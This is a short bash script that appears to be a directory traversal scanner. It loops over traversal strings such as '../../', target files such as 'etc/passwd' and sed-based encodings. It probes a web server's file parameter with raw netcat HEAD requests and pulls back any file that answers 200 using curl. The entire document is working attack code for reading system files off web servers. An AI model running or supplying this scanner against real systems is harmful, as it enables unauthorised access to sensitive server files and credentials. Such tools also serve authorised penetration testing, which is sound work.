#!/bin/bash
host="${1}"			# www.example.com
port="${2}"			# 80
path="${3}"			# /?file=
queries=./Assets/queries.txt 	# ../../
files=./Assets/files.txt	# etc/passwd
translations=./Assets/translations.txt

for file in $(cat $files) # 
do
	for translation in $(cat $translations)
	do
		for query in $(cat $queries)
		do
			queryy=$(echo $query | sed $translation)
			echo "HEAD $path$queryy$file HTTP/1.1\r\nHost: z\r\n\r\n" \
				| netcat -w5 $host $port | grep -E '\<200\>' 
		if [[ $? == 0 ]]; then
		curl --include "$host$path$queryy$file"
		fi 
		done
	done
done

exit 0
